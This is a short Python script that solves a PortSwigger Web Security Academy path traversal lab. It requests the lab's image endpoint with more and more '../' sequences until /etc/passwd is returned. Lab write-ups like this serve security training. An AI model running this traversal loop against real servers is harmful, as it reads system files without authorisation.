import requests
# Portswigger academy labs solutions

def path_traversal_1():
    # https://portswigger.net/web-security/learning-paths/server-side-vulnerabilities-apprentice/path-traversal-apprentice/file-path-traversal/lab-simple#
    # retrieve /etc/passwd contents
    laburl = "https://0afa009d03fbd3368060804300c8004e.web-security-academy.net/"
    labpath = "image?filename="
    found = False
    dir_lvl = 0
    while not found:
        url = laburl+labpath+"../"*dir_lvl+"etc/passwd"
        response = requests.get(url)
        print("Getting " + url + " - " + response.status_code.__str__())
        if response.status_code == 200:
            print("Found")
            found = True
        dir_lvl += 1

# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    path_traversal_1()
